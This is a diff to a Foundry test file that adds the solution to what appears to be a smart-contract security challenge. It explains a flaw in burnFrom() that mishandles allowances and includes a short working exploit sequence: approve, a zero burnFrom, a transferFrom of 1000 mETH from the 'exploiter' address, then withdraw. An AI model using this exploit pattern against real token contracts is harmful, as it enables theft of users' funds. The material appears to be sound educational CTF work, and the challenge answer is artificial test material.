@@ -37,7 +37,18 @@ contract Challenge1Test is Test {
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-    
+        // vulnerability:
+        // burnFrom() is incorrectly setting the allowance of the contract to use msg.sender so
+        // we can modify the allowance of any address in the contract
+
+        // first we need to approve the whitehat contract to burn tokens from the exploiter
+        mETH.approve(exploiter, 1000000000 ether);
+        // then we can call burnFrom() from the whitehat contract to burn tokens from the exploiter
+        mETH.burnFrom(exploiter, 0 ether);
+        // then we send the erc20 tokens to the whitehat contract
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+        // then we can call withdraw() from the whitehat contract to withdraw ether from the contract
+        mETH.withdraw(1000 ether);
 
         //==================================================//
         vm.stopPrank();
